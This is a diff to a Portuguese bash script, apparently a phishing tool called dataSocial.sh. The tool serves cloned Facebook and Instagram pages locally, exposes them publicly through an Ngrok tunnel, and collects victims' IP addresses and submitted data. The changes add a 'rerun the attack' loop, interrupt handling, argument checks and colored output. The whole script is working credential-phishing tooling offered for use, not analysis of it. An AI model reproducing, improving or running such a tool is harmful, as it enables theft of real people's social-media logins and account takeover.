@@ -33,6 +33,7 @@
 #     Adicionado instalador Ngrok
 # v0.4 2023-01-08, Oliver Silva:
 #     Adicionado o loop while no lugar da recursão infinita evitando o bug 'Segmentation fault'
+# v0.5 2023-03-19, Adicionado suporte a repetição do ataque
 #
 # Licença: MIT License
 #
@@ -40,11 +41,15 @@
 # Versão 0.2: Troca do GREP pelo JQ pra formatação dos dados
 # Versão 0.3: Instalador Ngrok
 # Versão 0.4: Bug 'Segmentation fault' resolvido o qual foi causado pela recursão infinita
+# Versão 0.5: Repetição do ataque caso precise
 #
 
+trap interruptTwo SIGINT SIGTSTP
 
 host="localhost"
 port="5555"
+
+args=$@
 
 serviceKey=0
 listenKey=0
@@ -54,25 +59,32 @@ verifyProot() {
     proot=$(ps -e | grep -Eo "proot")
 
     if [ -z "$proot" ] ; then
-	echo "[!] Execute este programa em uma shell proot!"
-	interrupt
+	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mExecute este programa em uma shell proot\e[0m"
+	interruptTwo
     fi
 }
 
 verifyLinks() {
     if [ "$1" == "null" -a "$2" == "null" ] ; then
-	echo -e "\e[31;1m[!] Links Ngrok nulos, execute este programa em outro tipo de shell proot ou execute este programa novamente\e[0m"
+	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mLinks Ngrok nulos, execute este programa em outro tipo de shell proot ou execute este programa novamente\e[0m"
     fi
 }
 
 interrupt() {
-    echo -e "\nPrograma interrompido!\n"
+    echo -e "\n\e[32m[\e[33;1m×\e[32m] \e[31;1mPrograma interrompido\e[0m"
     processKill
     removeFiles
-    exit 0
+    stty -echoctl
+    #exit 1
+}
+
+interruptTwo() {
+    interrupt
+    exit 1
 }
 
 listen() {
+    clear
 
     if  [ -n "$tunnel" -a "$tunnel" == "ngrok" ] ; then
 	functionGroup
@@ -110,7 +122,7 @@ copyFiles() {
 	cp -rf websites/${service}/* ./www
 
     else
-	echo "[!] Este serviço não está disponível!"
+	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mEste serviço não está disponível\e[0m"
 	exit 1
     fi
 }
@@ -125,7 +137,7 @@ tunnel() {
         showLinkNgrok
 
     else
-        echo "[!] Este tunnel não está disponível"
+        echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mEste tunnel não está disponível\e[0m"
 	exit 1
     fi
 }
@@ -137,14 +149,10 @@ processKill() {
 }
 
 showLink() {
-   trap interrupt SIGINT SIGTSTP
-
    echo -e "\e[32m[+] Localhost: \e[33;1m$host:$port\e[0m"
 }
 
 showLinkNgrok() {
-    trap interrupt SIGINT SIGTSTP
-
     addr=$(curl -sS http://${host}:4040/api/tunnels | jq -r ".tunnels[0].config.addr")
     public=$(curl -sS http://${host}:4040/api/tunnels | jq -r ".tunnels[0].public_url")
  
@@ -158,10 +166,20 @@ getDataCaptured() {
     get_ip
     get_data
 
+    control
+}
+
+control() {
     until [ "$REPLY" == "quit" ] ; do
-        echo -e "\e[32m[?] Digite '\e[33;1mctr+C\e[32m' OU '\e[33;1mquit\e[32m' para cancelar";read
+	echo -e "\e[32m[?] Digite '\e[33;1mctr+C\e[32m' \e[32m OU '\e[33;1mquit\e[32m' para cancelar OU '\e[33;1mrerun\e[32m' para realizar novamente este ataque";read
+
+	if [ "$REPLY" == "rerun" ] ; then
+	    rerun
+
+	fi
     done
-    interrupt
+
+    interruptTwo
 }
 
 get_ip() {
@@ -224,7 +242,7 @@ list() {
     services=("facebook" "instagram")
 
     for service in ${services[@]} ; do
-	echo "√ $service"
+	echo -e "\e[0m\e[32m[√] $service\e[0m"
     done
     exit 0
 }
@@ -250,10 +268,38 @@ installNgrokIfNotExists() {
     fi
 }
 
+rerun() {
+    echo -e "\e[32m[?] Realizar novamente este ataque? [y/n] : \e[0m" ; read
+
+    if [ -z "$REPLY" ] ; then
+	rerun
+
+    elif [ -n "$REPLY" -a "$REPLY" == "y" -o "$REPLY" == "Y" ] ; then
+	clear
+	interrupt && ./dataSocial.sh $args
+
+    elif [ -n "$REPLY" -a "$REPLY" == "n" -o "$REPLY" == "N" ] ; then
+	interruptTwo
+
+    else
+	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mResposta inválida, tente '\e[33;1my\e[31;1m' ou '\e[33;1mn\e[31;1m'\e[0m"
+	rerun
+    fi
+}
+
 if [ -z "$1" ] ; then
     banner
-    echo "[!] tente -h, --help para ajuda"
+    echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mtente \e[33;1m-h\e[31;1m, \e[33;1m--help \e[31;1mpara ajuda\e[0m"
     exit 1
+
+elif [ -n "$1" ] ; then
+    
+    if [ ${#@} -gt 5 ] ; then
+	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mUltrapassou o limite de argumentos necessários\e[0m"
+	exit 1
+
+    fi
+
 fi
 
 while [ -n "$1" ] ; do
@@ -265,7 +311,7 @@ while [ -n "$1" ] ; do
 	    shift
 
 	    if [ -z "$1" ] ; then
-		echo "[!] Faltou expecificar a rede social"
+		echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mFaltou expecificar o serviço social\e[0m"
 		exit 1
 	    fi
 	
@@ -277,7 +323,7 @@ while [ -n "$1" ] ; do
 	    shift
 	
 	    if [ -z "$1" ] ; then
-		echo "[!] Faltou expecificar o tunnel"
+		echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mFaltou expecificar o tunnel\e[0m"
 		exit 1
 	    fi
 	    
@@ -286,7 +332,7 @@ while [ -n "$1" ] ; do
 	    ;;
 
 	*)
-	    echo "Opção inválida!" && exit 1;;
+	    echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mOpção inválida: \e[33;1m$1\e[0m" && exit 1;;
     esac
     shift
 done
@@ -298,6 +344,6 @@ elif [ "$serviceKey" == 1 -a "$listenKey" == 1 -a "$tunnelKey" == 1 ] ; then
     listen && tunnel && getDataCaptured
 
 else
-    echo -e "[!] Erro ao processar o comando, -h, --help para mais detalhes"
+    echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mErro ao processar o comando, tente: \e[33;1m-h\e[31;1m, \e[33;1m--help \e[31;1mpara mais detalhes\e[0m"
     exit 1
 fi
